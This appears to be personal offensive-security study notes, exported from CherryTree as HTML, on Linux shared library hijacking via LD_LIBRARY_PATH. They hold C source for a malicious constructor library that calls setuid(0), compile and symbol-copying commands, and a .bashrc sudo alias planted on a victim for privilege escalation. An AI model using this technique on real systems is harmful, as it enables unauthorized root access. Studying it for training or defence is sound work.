<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>shared library hijacking via LD_LIBRARY_PATH</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>shared library hijacking via LD_LIBRARY_PATH</h1><br/><p></p><p><h2>Shared Library Hijacking Intro</h2><ul><li>• <small>• similar to DLL hijacking </small></li><li><small>When an application runs on Linux, it checks for its required libraries in a number of locations in a specific order. When it finds a copy of the library it needs, it stops searching and loads the module it finds.</small></li><li><small>The application searches for libraries in these locations, following this ordering.</small><small>  1. Directories listed in the application’s </small><strong><small>RPATH</small></strong><small> value.</small><small>  2. Directories specified in the </small><strong><small>LD_LIBRARY_PATH</small></strong><small> environment variable.</small><small>  3. Directories listed in the application’s </small><strong><small>RUNPATH</small></strong><small> value.</small><small>  4. Directories specified in </small><strong><small>/etc/ld.so.conf</small></strong><small>  5. System library directories: </small><strong><small>/lib, /lib64, /usr/lib, /usr/lib64, /usr/local/lib, /usr/local/lib64</small></strong><small>, and potentially others. </small></li></ul></p><p></p><p><h2>Shared Library hijacking condition</h2><ul><li>cron job sudo of a user that we control</li><li>modification of .bashrc OF USER</li></ul></p><p><h2>Shared Library Hijacking via LD_LIBRARY_PATH</h2></p><p><div class="codebox"><pre><span style="color:#7f0044;font-weight:700">#include &lt;stdio.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;stdlib.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;unistd.h&gt;</span> <span style="color:#0088ff;font-weight:400">// for setuid/setgid</span><br /><span style="color:#7f0044;font-weight:400">static</span> <span style="color:#7f0044;font-weight:400">void</span> runmahpayload() __attribute__((constructor));<br /><span style="color:#7f0044;font-weight:400">void</span> runmahpayload() {<br />    setuid(<span style="color:#ff0044;font-weight:400">0</span>);<br />    setgid(<span style="color:#ff0044;font-weight:400">0</span>);<br />    printf(<span style="color:#3ad900;font-weight:400">&quot;DLL HIJACKING IN PROGRESS \n&quot;</span>);<br />    system(<span style="color:#3ad900;font-weight:400">&quot;touch /tmp/haxso.txt&quot;</span>);<br />}</pre></div><ul><li></li></ul></p><p></p><p><div class="codebox"><pre><br /><span style="color:#ff9d00;font-weight:700">gcc</span> -Wall -fPIC -c -o hax.o hax.c<br /><span style="color:#0088ff;font-weight:400">## The -fPIC option tells the compiler to use position independent code</span><br /><span style="color:#0088ff;font-weight:400"># create shared library</span><br /><span style="color:#ff9d00;font-weight:700">gcc</span> -shared -o libhax.so hax.o<br /><span style="color:#0088ff;font-weight:400">## ldd gives what libraries are loaded when program execute </span><br />ldd <span style="color:#7f0044;font-weight:400">$binary</span><br /><span style="color:#0088ff;font-weight:400">### example : libraries that output errors less likely to be used on normal behaviour </span><br /><span style="color:#ff9d00;font-weight:700">export</span> <span style="color:#7f0044;font-weight:400">LD_LIBRARY_PATH</span>=/home/offsec/ldlib/<br /><span style="color:#0088ff;font-weight:400">#find symbols exported by libraries and declare them at the begining of the code and recompile</span><br />readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> FUNC <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> GPG_ERROR <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">awk</span> <span style="color:#3ad900;font-weight:400">&#39;{print &quot;int&quot;,$8}&#39;</span> <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">sed</span> <span style="color:#3ad900;font-weight:400">&#39;s/@@GPG_ERROR_1.0/;/g&#39;</span>   <br /><br /><span style="color:#0088ff;font-weight:400"># cp library to hijack the same name as the true one in the LD_library_path</span><br /><span style="color:#ff9d00;font-weight:700">cp</span> libhax.so libgpg-error.so.0<br /><span style="color:#0088ff;font-weight:400">### if an error on missing version create a gpg.map and recompile with --version-script gpg.map (see 401 pdf)</span><br /><br /><br /><span style="color:#0088ff;font-weight:400">## how to be run as oot</span><br /><span style="color:#0088ff;font-weight:400">### update .bashrc of victim </span><br /> <span style="color:#ff9d00;font-weight:700">alias</span> sudo = sudo LD_LIBRARY_PATH=<span style="color:#7f0044;font-weight:400">$dir</span> -E</pre></div></p><p></p><p></p><p></p></div>
</body>
</html>
